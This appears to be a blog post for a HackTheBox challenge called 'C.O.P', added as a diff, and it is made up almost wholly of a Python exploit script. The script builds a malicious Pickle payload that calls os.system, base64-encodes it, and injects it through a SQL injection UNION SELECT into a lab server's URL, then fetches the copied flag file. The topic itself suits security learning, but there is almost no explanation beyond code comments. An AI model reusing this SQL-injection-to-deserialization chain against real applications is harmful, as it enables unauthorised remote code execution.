@@ -1,0 +1,42 @@
+---
+title: "C.O.P (HackTheBox): SQL Injection → Pickle Deserialization RCE"
+published: 2024-01-15
+description: "Exploiting a SQL injection vulnerability to inject a malicious Pickle payload, achieving remote code execution and capturing the flag."
+tags: [HackTheBox, SQL Injection, Pickle, Deserialization, Python]
+category: Web Exploitation
+image: ./cover.jpg
+draft: false
+---
+
+# ![image](https://y.yarn.co/787d48e3-8bf8-4364-91d4-98e55ef95579_text.gif)
+
+
+```py
+import pickle
+import base64
+import os
+import requests
+
+# Payload to be executed on the server
+payload = 'cp flag.txt application/static/achux21.txt'
+
+# Class definition for creating a serialized payload using Pickle
+class RCE:
+    def __reduce__(self):
+        return os.system, (payload,)
+
+# If the script is run directly, not imported as a module
+if __name__ == '__main__':
+    # Serialize the payload using Pickle and encode it in base64
+    var = base64.urlsafe_b64encode(pickle.dumps(RCE())).decode('ascii')
+
+# Craft a URL to trigger the SQL injection vulnerability
+# The UNION SELECT statement is used to inject the serialized payload
+r = requests.get(f"http://167.99.82.136:30931/view/%27%20UNION%20SELECT%27{var}")
+
+# Retrieve the result of the executed payload
+flag = requests.get(f"http://167.99.82.136:30931/static/achux21.txt")
+
+# Print the result (flag)
+print(flag.text)
+```
